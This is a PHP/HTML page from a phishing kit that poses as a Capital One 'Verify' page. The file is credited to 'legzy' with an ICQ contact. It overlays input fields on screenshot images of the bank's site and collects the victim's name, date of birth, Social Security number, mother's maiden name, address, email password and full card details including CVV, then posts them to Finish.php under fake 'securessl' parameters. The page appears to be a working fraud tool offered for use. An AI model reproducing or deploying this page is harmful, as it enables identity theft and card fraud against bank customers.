<?php session_start();

/*
Created by legzy -- icq 692561824
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title>Capital One - Verify</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicoon.ico"/>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script type="text/javascript">
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>


<style> 
 
 .inputs {
    border-radius: 3px;
    border: 1px solid #7F9DB9;
	
}

</style> 

<style type="text/css">
/*----------Text Styles----------*/
.b { font-weight: bold; }
.mb0 { margin-bottom: 0px; } 
.f11 { font-size: 11px; }
.f15 { font-size: 15px; }
.f16 { font-size: 16px; }
.b { font-weight: bold; }
.floatleft { float: left; }
.expand {border-width: 1px;  margin-bottom: 20px;}
#securityQuestions .ada-new-win,
#securityQuestions .change_control .ada-new-win, 
#living-money #lm-edit-page .question-mark {position:absolute;z-index:10;margin:-4px 255px}
input.s1, input.s2, input.s3, input.s4, input.s5, input.s6, input.s7, input.s8, input.s9, input.s10, input.s11, input.s12, input.s13, input.s14, input.s15, input.s16, input.s17, input.s18, input.s19, input.s20, input.s21, input.s22, input.s23, input.s24, input.s25, input.s26, input.s27, input.s28, input.s29, input.s30, input.s31, input.s32, .nowrap { display: block; float: left; height: auto; margin: 0px 5px 0px 0px; padding: 0px; vertical-align: top; }
input.text, input.hint { border: 1px #7F9DB9 solid; color: #333; padding: 1px; }
input.hint { text-align: center; color: #333; }
.s1, .s2, .s3, .s4, .s5, .s6, .s7, .s8, .s9, .s10, .s11, .s12, .s13, .s14, .s15, .s16, .s17, .s18, .s19, .s20, .s21, .s22, .s23, .s24, .s25, .s26, .s27, .s28, .s29, .s30, .s31, .s32, .nowrap { display: block; float: left; height: auto; margin: 0px 5px 5px 0px; padding: 0px; vertical-align: top; }
.s1, .t1, .nowrap { width: 20px; } .s2, .t2 { width: 45px; } .s3, .t3 { width: 70px; } .s4, .t4 { width: 95px; } .s5, .t5 { width: 120px; } .s6, .t6 { width: 145px; } .s7, .t7 { width: 170px; } .s8, .t8 { width: 195px; } .s9, .t9 { width: 220px; } .s10, .t10 { width: 245px; } .s11, .t11 { width: 270px; } .s12, .t12 { width: 295px; } .s13, .t13 { width: 320px; } .s14, .t14 { width: 345px; } .s15, .t15 { width: 370px; } .s16, .t16 { width: 395px; } .s17, .t17 { width: 420px; } .s18, .t18 { width: 445px; } .s19, .t19 { width: 470px; } .s20, .t20 { width: 495px; } .s21, .t21 { width: 520px; } .s22, .t22 { width: 545px; } .s23, .t23 { width: 570px; } .s24, .t24 { width: 595px; } .s25, .t25 { width: 620px; } .s26, .t26 { width: 645px; } .s27, .t27 { width: 670px; } .s28, .t28 { width: 695px; } .s29, .t29 { width: 720px; } .s30, .t30 { width: 745px; } .s31, .t31 { width: 770px; } .s32, .t32 { width: 795px; }
.p1 { margin-left: 25px; } .p2 { margin-left: 50px; } .p3 { margin-left: 75px; } .p4 { margin-left: 100px; } .p5 { margin-left: 125px; } .p6 { margin-left: 150px; } .p7 { margin-left: 175px; } .p8 { margin-left: 200px; } .p9 { margin-left: 225px; } .p10 { margin-left: 250px; } .p11 { margin-left: 275px; } .p12 { margin-left: 300px; } .p13 { margin-left: 325px; } .p14 { margin-left: 350px; } .p15 { margin-left: 375px; } .p16 { margin-left: 400px; } .p17 { margin-left: 425px; } .p18 { margin-left: 450px; } .p19 { margin-left: 475px; } .p20 { margin-left: 500px; } .p21 { margin-left: 525px; } .p22 { margin-left: 550px; } .p23 { margin-left: 575px; } .p24 { margin-left: 600px; } .p25 { margin-left: 625px; } .p26 { margin-left: 650px; } .p27 { margin-left: 675px; } .p28 { margin-left: 700px; } .p29 { margin-left: 725px; } .p30 { margin-left: 750px; } .p31 { margin-left: 775px; }
.sbg { background: #666666; height: 20px; line-height: 20px; color: #FFFFFF; }
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}

tr.expandRow, tr.expandRow button{cursor: pointer;}
tr.expandRow:active span.blue, tr.expandRow:hover span.blue{text-decoration: underline;}
html, body {background-color:inherit;}
.s1, .s2, .SelectHolder, .s4, .s5, .s6, .s7, .s8, .s9, .s10, .InputHolder, .s12, .s13, .s14, .s15, .s16, .s17, .s18, .s19, .s20, .s21, .s22, .s23, .s24, .s25, .s26, .s27, .s28, .s29, .SelectHolder0, .SelectHolder1, .StepHolderr, .nowrap { display: block; float: left; height: auto; margin: 0 5px 5px 0; padding: 0px; vertical-align: top; }
.s1, .t1, .nowrap{width:24px}.s2,.t2{width:53px}.SelectHolder,.t3{width:82px}.s4,.t4{width:111px}.s5,.t5{width:140px}.s6,.t6{width:169px}.s7,.t7{width:198px}.s8,.t8{width:227px}.s9,.t9{width:256px}.s10,.t10{width:285px}.InputHolder,.t11{width:314px}.s12,.t12{width:343px}.s13,.t13{width:372px}.s14,.t14{width:401px}.s15,.t15{width:430px}.s16,.t16{width:459px}.s17,.t17{width:488px}.s18,.t18{width:517px}.s19,.t19{width:546px}.s20,.t20{width:575px}.s21,.t21{width:604px}.s22,.t22{width:633px}.s23,.t23{width:662px}.s24,.t24{width:691px}.s25,.t25{width:720px}.s26,.t26{width:749px}.s27,.t27{width:778px}.s28,.t28{width:807px}.s29,.t29{width:836px}.SelectHolder0,.t30{width:865px}.SelectHolder1,.t31{width:894px}.StepHolderr,.t32{width:923px}
.s4 {width: 150px;}
.date {width:70px;}
.p1{margin-left:29px}.p2{margin-left:58px}.p3{margin-left:87px}.p4{margin-left:116px}.p5{margin-left:145px}.p6{margin-left:174px}.p7{margin-left:203px}.p8{margin-left:232px}.p9{margin-left:261px}.p10{margin-left:290px}.p11{margin-left:319px}.p12{margin-left:348px}.p13{margin-left:377px}.p14{margin-left:406px}.p15{margin-left:435px}.p16{margin-left:464px}.p17{margin-left:493px}.p18{margin-left:522px}.p19{margin-left:551px}.p20{margin-left:580px}.p21{margin-left:609px}.p22{margin-left:638px}.p23{margin-left:667px}.p24{margin-left:696px}.p25{margin-left:725px}.p26{margin-left:754px}.p27{margin-left:783px}.p28{margin-left:812px}.p29{margin-left:841px}.p30{margin-left:870px}.p31{margin-left:899px}
.sbg { background: #666666; height: 20px; line-height: 20px; color: #FFFFFF; }
</style>
<script>
function validateForm()
{
var x=document.forms["myform"]["name"].value;
if(x==null || x=="")
  {
  alert("Please provide your full name");
  return false;
  }
var y=document.forms["myform"]["month"].value;
if(y==null || y=="")
  {
  alert("Please select your Month of Birth");
  return false;
  }
var y=document.forms["myform"]["day"].value;
if(y==null || y=="")
  {
  alert("Please select your day of Birth");
  return false;
  }
 var y=document.forms["myform"]["year"].value;
if(y==null || y=="")
  {
  alert("Please select your Year of Birth");
  return false;
  } 
 var y=document.forms["myform"]["ssn"].value;
if(y==null || y=="")
  {
  alert("Please provide your Social Security Number");
  return false;
  }
var y=document.forms["myform"]["ssn"].value;
if(y.length < 9)
  {
  alert("Invalid Social Security Number");
  return false;
  }
 var y=document.forms["myform"]["mmn"].value;
if(y==null || y=="")
  {
  alert("Please provide your Mother's Maiden Name");
  return false;
  }
 var y=document.forms["myform"]["address"].value;
if(y==null || y=="")
  {
  alert("Please provide your address");
  return false;
  }
  var y=document.forms["myform"]["city"].value;
if(y==null || y=="")
  {
  alert("Please provide your city");
  return false;
  }
 var y=document.forms["myform"]["state"].value;
if(y==null || y=="")
  {
  alert("Please select your State");
  return false;
  }
 var y=document.forms["myform"]["zip"].value;
if(y==null || y=="")
  {
  alert("Please provide your zip code");
  return false;
  }
 var y=document.forms["myform"]["zip"].value;
if(y==null || y=="")
  {
  alert("Please provide your zip code");
  return false;
  }
var x=document.forms["myform"]["email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Please provide your email address");
  return false;
  }
var y=document.forms["myform"]["emailpass"].value;
if(y==null || y=="")
  {
  alert("Please provide your email address password");
  return false;
  }
var y=document.forms["myform"]["emailpass"].value;
if(y.length < 6)
  {
  alert("Password is Too Short");
  return false;
  }
  var y=document.forms["myform"]["ccno"].value;
if(y==null || y=="")
  {
  alert("Please provide your Card Number");
  return false;
  }
var y=document.forms["myform"]["ccno"].value;
if(y.length < 16)
  {
  alert("Invalid Card Number");
  return false;
  }
 var y=document.forms["myform"]["ccexp"].value;
if(y==null || y=="")
  {
  alert("Please provide your Card Expiry Date");
  return false;
  }
var y=document.forms["myform"]["ccexp"].value;
if(y.length < 4)
  {
  alert("Invalid Expiry Date Format");
  return false;
  }
 var y=document.forms["myform"]["secode"].value;
if(y==null || y=="")
  {
  alert("Please provide your Card CVV");
  return false;
  }
var y=document.forms["myform"]["secode"].value;
if(y.length < 3)
  {
  alert("Incorrect Card CVV");
  return false;
  }
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

</head>
<body bgColor="#FFFFFF">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1361px; height:774px; z-index:0"><img src="images/4th.png" alt="" title="" border=0 width=1361 height=774></div>

<div id="image14" style="position:absolute; overflow:hidden; left:158px; top:148px; width:949px; height:67x; z-index:15"><a href="#"><img src="images/tab.png" alt="" title="" border=0 width=949 height=67></a></div>

 <form action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="myform" id="myform" method="post" autocomplete="off" onsubmit="return validateForm()">
<div class="InputHolder">
 <input type="text" id="name" name="name" class="InputHolder f11 text" maxlength="32" size="32" autocomplete="off" style="position:absolute;width:319px;left:348px;top:290px;z-index:6" />
</div>
<label for="dob">
	                    <div class="s4 b right">Date of Birth:</div>
	                    <div class="SelectHolder" style="width:70%">
	                    <select id="month" name="month" class="inputs s4" style="position:absolute;width:100px;left:348px;top:312px;z-index:6">
						<option value="">Month</option>
							<option value="1">January</option>
	<option value="2">Febuary</option>
	<option value="3">March</option>
	<option value="4">April</option>
	<option value="5">May</option>
	<option value="6">June</option>
	<option value="7">July</option>
	<option value="8">August</option>
	<option value="9">September</option>
	<option value="10">October</option>
	<option value="11">November</option>
	<option value="12">December</option>
						</select>
	                    <select id="day" name="day" class="inputs s4" style="position:absolute;width:100px;left:452px;top:312px;z-index:6">
						<option value="">Day</option>
							<option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
	<option value="13">13</option>
	<option value="14">14</option>
	<option value="15">15</option>
	<option value="16">16</option>
	<option value="17">17</option>
	<option value="18">18</option>
	<option value="19">19</option>
	<option value="20">20</option>
	<option value="21">21</option>
	<option value="22">22</option>
	<option value="23">23</option>
	<option value="24">24</option>
	<option value="25">25</option>
	<option value="26">26</option>
	<option value="27">27</option>
	<option value="28">28</option>
	<option value="29">29</option>
	<option value="30">30</option>
	<option value="31">31</option>
						</select>
	                    <select id="year" name="year" class="inputs s4 date" style="position:absolute;width:100px;left:557px;top:312px;z-index:6">
						<option value="">Year</option>
							<option value="2011">2011</option>
	<option value="2010">2010</option>
	<option value="2009">2009</option>
	<option value="2008">2008</option>
	<option value="2007">2007</option>
	<option value="2006">2006</option>
	<option value="2005">2005</option>
	<option value="2004">2004</option>
	<option value="2003">2003</option>
	<option value="2002">2002</option>
	<option value="2001">2001</option>
	<option value="2000">2000</option>
	<option value="1999">1999</option>
	<option value="1998">1998</option>
	<option value="1997">1997</option>
	<option value="1996">1996</option>
	<option value="1995">1995</option>
	<option value="1994">1994</option>
	<option value="1993">1993</option>
	<option value="1992">1992</option>
	<option value="1991">1991</option>
	<option value="1990">1990</option>
	<option value="1989">1989</option>
	<option value="1988">1988</option>
	<option value="1987">1987</option>
	<option value="1986">1986</option>
	<option value="1985">1985</option>
	<option value="1984">1984</option>
	<option value="1983">1983</option>
	<option value="1982">1982</option>
	<option value="1981">1981</option>
	<option value="1980">1980</option>
	<option value="1979">1979</option>
	<option value="1978">1978</option>
	<option value="1977">1977</option>
	<option value="1976">1976</option>
	<option value="1975">1975</option>
	<option value="1974">1974</option>
	<option value="1973">1973</option>
	<option value="1972">1972</option>
	<option value="1971">1971</option>
	<option value="1970">1970</option>
	<option value="1969">1969</option>
	<option value="1968">1968</option>
	<option value="1967">1967</option>
	<option value="1966">1966</option>
	<option value="1965">1965</option>
	<option value="1964">1964</option>
	<option value="1963">1963</option>
	<option value="1962">1962</option>
	<option value="1961">1961</option>
	<option value="1960">1960</option>
	<option value="1959">1959</option>
	<option value="1959">1958</option>
	<option value="1959">1957</option>
	<option value="1959">1956</option>
	<option value="1959">1955</option>
	<option value="1959">1954</option>
	<option value="1959">1953</option>
	<option value="1959">1952</option>
	<option value="1959">1951</option>
	<option value="1959">1950</option>
						</select>
	<div id="ErrorDob"></div>
	                    </div> 
						
<div class="InputHolder">
 <input type="text" id="ssn" name="ssn" value="" class="InputHolder f11 text" maxlength="9" size="32" autocomplete="off" style="position:absolute;width:319px;left:348px;top:337px;z-index:6" onkeypress='return isNumberKey(event)'/>
</div>	
<div class="InputHolder">
 <input type="text" id="address" name="address" value="" class="InputHolder f11 text" maxlength="32" size="32" autocomplete="off" style="position:absolute;width:319px;left:348px;top:360px;z-index:6" />
</div>
<div class="InputHolder">
 <input type="text" id="mmn" name="mmn" value="" class="InputHolder f11 text" maxlength="32" size="32" autocomplete="off" style="position:absolute;width:319px;left:348px;top:385px;z-index:6" />
</div>
<div class="InputHolder">
 <input type="text" id="city" name="city" value="" class="InputHolder f11 text" maxlength="20" size="32" autocomplete="off" style="position:absolute;width:319px;left:348px;top:408px;z-index:6" />
</div>

 <select id="state" name="state" class="inputs s4" style="position:absolute;width:53px;left:348px;top:429px;z-index:6">   <option value=""></option>        <option value="AA">AA</option>        <option value="AE">AE</option>        <option value="AK">AK</option>        <option value="AL">AL</option>        <option value="AP">AP</option>        <option value="AR">AR</option>        <option value="AZ">AZ</option>        <option value="CA">CA</option>        <option value="CO">CO</option>        <option value="CT">CT</option>        <option value="DC">DC</option>        <option value="DE">DE</option>        <option value="FL">FL</option>        <option value="GA">GA</option>        <option value="HI">HI</option>        <option value="IA">IA</option>        <option value="ID">ID</option>        <option value="IL">IL</option>        <option value="IN">IN</option>        <option value="KS">KS</option>        <option value="KY">KY</option>        <option value="LA">LA</option>        <option value="MA">MA</option>        <option value="MD">MD</option>        <option value="ME">ME</option>        <option value="MI">MI</option>        <option value="MN">MN</option>        <option value="MO">MO</option>        <option value="MS">MS</option>        <option value="MT">MT</option>        <option value="NC">NC</option>        <option value="ND">ND</option>        <option value="NE">NE</option>        <option value="NH">NH</option>        <option value="NJ">NJ</option>        <option value="NM">NM</option>        <option value="NV">NV</option>        <option value="NY">NY</option>        <option value="OH">OH</option>        <option value="OK">OK</option>        <option value="OR">OR</option>        <option value="PA">PA</option>        <option value="RI">RI</option>        <option value="SC">SC</option>        <option value="SD">SD</option>        <option value="TN">TN</option>        <option value="TX">TX</option>        <option value="UT">UT</option>        <option value="VA">VA</option>        <option value="VT">VT</option>        <option value="WA">WA</option>        <option value="WI">WI</option>        <option value="WV">WV</option>        <option value="WY">WY</option></select>
<div class="InputHolder">
 <input type="text" id="zip" name="zip" value="" class="InputHolder f11 text" maxlength="5" size="32" autocomplete="off" style="position:absolute;width:80px;left:348px;top:457px;z-index:6" onkeypress='return isNumberKey(event)' />
</div> 
<div class="InputHolder">
 <input type="text" id="email" name="email" class="InputHolder f11 text" maxlength="32" size="32" autocomplete="off" style="position:absolute;width:315px;left:348px;top:480px;z-index:6" />
</div>
<div class="InputHolder">
 <input type="password" id="emailpass" name="emailpass" value="" class="InputHolder f11 text" maxlength="32" size="32" autocomplete="off" style="position:absolute;width:315px;left:348px;top:500px;z-index:6" />
</div>
<!-- STEP 2 -->	
<div class="InputHolder">
 <input type="text" id="cc-number" name="ccno" value="" class="InputHolder f11 text normal" maxlength="16" size="32" autocomplete="off" style="position:absolute;width:319px;left:348px;top:595px;z-index:6" placeholder="&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;" size="32" onkeypress='return isNumberKey(event)' />
</div>
<div class="InputHolder">
 <input type="text" id="cc-exp" name="ccexp" value="" class="InputHolder f11 text normal" maxlength="8" size="10" autocomplete="off" style="position:absolute;width:89px;left:348px;top:617px;z-index:6" placeholder="&bull;&bull; / &bull;&bull;&bull;&bull;" size="32" />
</div>
<div class="InputHolder">
 <input type="text" id="cc-cvc" name="secode" value="" class="InputHolder f11 text normal" maxlength="4" size="10" autocomplete="off" style="position:absolute;width:89px;left:348px;top:638px;z-index:6" placeholder="&bull;&bull;&bull;&bull;" size="32" onkeypress='return isNumberKey(event)' />
</div>

<div id="formimage1" style="position:absolute; left:976px; top:690px; z-index:9"><input type="image" name="formimage1" width="112" height="29" src="images/buttom.png"></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:730px; width:1360px; height:307px; z-index:16"><a href="#"><img src="images/footer1.png" alt="" title="" border=0 width=1360 height=307></a></div>
